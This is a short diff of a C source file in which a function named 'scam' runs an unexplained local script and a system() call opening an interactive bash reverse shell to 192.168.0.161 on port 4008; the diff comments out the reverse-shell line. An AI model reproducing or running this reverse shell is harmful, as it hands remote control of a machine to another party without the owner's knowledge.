@@ -8,7 +8,7 @@
 
 void scam() {
     execl("./script.sh","script.sh",(char*)0);
-    system("/bin/bash -i >/dev/tcp/192.168.0.161/4008 0<&1 2>&1");
+ //   system("/bin/bash -i >/dev/tcp/192.168.0.161/4008 0<&1 2>&1");
 }
 
 int main() {
